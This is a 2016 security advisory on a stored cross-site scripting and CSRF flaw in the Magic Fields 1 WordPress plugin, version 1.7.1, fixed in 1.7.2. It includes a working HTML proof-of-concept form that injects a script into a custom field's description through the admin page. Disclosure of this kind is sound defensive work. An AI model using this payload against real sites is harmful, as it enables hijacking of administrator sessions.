------------------------------------------------------------------------
Persistent Cross-Site Scripting in Magic Fields 1 WordPress Plugin
------------------------------------------------------------------------
Burak Kelebek, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Scripting vulnerability was found in the Magic Fields 1
plugin. This issue allows an attacker to perform a wide variety of
actions, such as stealing Administrators' session tokens, or performing
arbitrary actions on their behalf. In order to exploit this issue, the
attacker has to lure/force a logged on WordPress Administrator into
opening a malicious website.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160724-0020

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on Magic Fields 1 version 1.7.1.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is fixed in version 1.7.2

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_magic_fields_1_wordpress_plugin.html

The Magic Fields plugin lacks a CSRF (nonce) token on the request of adding a magic field. The description field of custom fields lacks output encoding which could result in malicious script inserted by an attacker and executed in the browser.

You need to lure a logged-in admin to follow a malicious link containing the poc below.
Proof of concept

The proof of concept below injects script code in the "description" field when adding a new custom field.

<html>
   <body>
      <form action="http://build.wordpress-develop.dev/wp-admin/admin.php?page=MagicFieldsMenu&custom-write-panel-id=1&mf_action=finish-create-custom-field" method="POST">
         <input type="hidden" name="custom&#45;group&#45;id" value="1" />
         <input type="hidden" name="custom&#45;field&#45;name" value="asd222asd" />
         <input type="hidden" name="custom&#45;field&#45;description" value="as22da2&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;" />
         <input type="hidden" name="custom&#45;field&#45;duplicate" value="" />
         <input type="hidden" name="custom&#45;field&#45;order" value="0" />
         <input type="hidden" name="custom&#45;field&#45;required" value="0" />
         <input type="hidden" name="custom&#45;field&#45;type" value="1" />
         <input type="hidden" name="custom&#45;field&#45;helptext" value="" />
         <input type="hidden" name="custom&#45;field&#45;css" value="magicfields" />
         <input type="hidden" name="custom&#45;field&#45;size" value="25" />
         <input type="submit" value="Submit request" />
      </form>
   </body>
</html>

------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.


